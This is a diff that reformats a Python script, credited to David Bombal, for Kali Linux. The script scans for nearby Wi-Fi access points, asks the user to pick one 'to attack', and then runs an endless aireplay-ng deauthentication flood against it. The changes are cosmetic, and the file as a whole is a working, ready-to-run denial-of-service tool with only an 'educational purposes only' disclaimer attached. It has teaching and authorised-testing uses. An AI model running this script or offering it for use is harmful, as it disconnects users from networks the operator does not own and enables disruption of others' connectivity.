@@ -1,6 +1,8 @@
-  
 #!/usr/bin/env python3
-# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
+
+
+# Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or
+# have authorization to test.
 
 # We will be using the subprocess module to run commands on Kali Linux.
 import subprocess
@@ -20,7 +22,8 @@ from datetime import datetime
 # We declare an empty list where all active wireless networks will be saved to.
 active_wireless_networks = []
 
-# We use this function to test if the ESSID is already in the list file. 
+
+# We use this function to test if the ESSID is already in the list file.
 # If so we return False so we don't add it again.
 # If it is not in the lst we return True which will instruct the elif 
 # statement to add it to the lst.
@@ -39,6 +42,7 @@ def check_for_essid(essid, lst):
 
     return check_status
 
+
 # Basic user interface header
 print(r"""______            _     _  ______                 _           _ 
 |  _  \          (_)   | | | ___ \               | |         | |
@@ -51,7 +55,6 @@ print("\n* Copyright of David Bombal, 2021                              *")
 print("\n* https://www.davidbombal.com                                  *")
 print("\n* https://www.youtube.com/davidbombal                          *")
 print("\n****************************************************************")
-
 
 # If the user doesn't run the program with super user privileges, don't allow them to continue.
 if not 'SUDO_UID' in os.environ.keys():
@@ -78,11 +81,11 @@ for file_name in os.listdir():
 # Regex to find wireless interfaces, we're making the assumption they will all be wlan0 or higher.
 wlan_pattern = re.compile("^wlan[0-9]+")
 
-# Python allows us to run system commands by using a function provided by the subprocess module. 
-# subprocess.run(<list of command line arguments goes here>, <specify if you want the capture_output to be True>)
-# We want to capture the output. The output will be in standard UTF-8 and will decode it.
-# The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
-# We run the iwconfig command to look for wireless interfaces.
+# Python allows us to run system commands by using a function provided by the subprocess module. subprocess.run(<list
+# of command line arguments goes here>, <specify if you want the capture_output to be True>) We want to capture the
+# output. The output will be in standard UTF-8 and will decode it. The script is the parent process and creates a
+# child process which runs the system command, and will only continue once the child process has completed. We run
+# the iwconfig command to look for wireless interfaces.
 check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
 
 # No WiFi Adapter connected.
@@ -110,11 +113,10 @@ hacknic = check_wifi_result[int(wifi_interface_choice)]
 # Kill conflicting WiFi processses
 print("WiFi adapter connected!\nNow let's kill conflicting processes:")
 
-# subprocess.run(<list of command line arguments goes here>)
-# The script is the parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
-# We run the iwconfig command to look for wireless interfaces.
-# Killing all conflicting processes using airmon-ng
-kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+# subprocess.run(<list of command line arguments goes here>) The script is the parent process and creates a child
+# process which runs the system command, and will only continue once the child process has completed. We run the
+# iwconfig command to look for wireless interfaces. Killing all conflicting processes using airmon-ng
+kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
 
 # Put wireless in Monitored mode
 print("Putting Wifi adapter into monitored mode:")
@@ -124,7 +126,9 @@ put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
 # The Popen method opens a pipe from a command. The output is an open file that can be accessed by other programs.
 # We run the iwconfig command to look for wireless interfaces.
 # Discover access points
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(
+    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
+    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 try:
@@ -132,22 +136,24 @@ try:
         # We want to clear the screen before we print the network interfaces.
         subprocess.call("clear", shell=True)
         for file_name in os.listdir():
-                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
-                # The following list contains the field names for the csv entries.
-                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
-                if ".csv" in file_name:
-                    with open(file_name) as csv_h:
-                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
-                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
-                        csv_h.seek(0)
-                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
-                        for row in csv_reader:
-                            if row["BSSID"] == "BSSID":
-                                pass
-                            elif row["BSSID"] == "Station MAC":
-                                break
-                            elif check_for_essid(row["ESSID"], active_wireless_networks):
-                                active_wireless_networks.append(row)
+            # We should only have one csv file as we backup all previous csv files from the folder every time we run
+            # the program. The following list contains the field names for the csv entries.
+            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
+                          'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
+            if ".csv" in file_name:
+                with open(file_name) as csv_h:
+                    # We use the DictReader method and tell it to take the csv_h contents and then apply the
+                    # dictionary with the fieldnames we specified above. This creates a list of dictionaries with the
+                    # keys as specified in the fieldnames.
+                    csv_h.seek(0)
+                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                    for row in csv_reader:
+                        if row["BSSID"] == "BSSID":
+                            pass
+                        elif row["BSSID"] == "Station MAC":
+                            break
+                        elif check_for_essid(row["ESSID"], active_wireless_networks):
+                            active_wireless_networks.append(row)
 
         print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
         print("No |\tBSSID              |\tChannel|\tESSID                         |")
@@ -180,8 +186,11 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 # Monitoring takes place on a different channel and we need to set it to that channel. 
 subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
 
-# Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
-subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
+# Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to
+# subprocess.DEVNULL. We will thus run deauthenticate in the background.
+subprocess.Popen(
+    ["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"],
+    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
 try:
@@ -192,6 +201,3 @@ except KeyboardInterrupt:
     # We run a subprocess.run command where we stop monitoring mode on the network adapter.
     subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
     print("Thank you! Exiting now")
-
-
-    
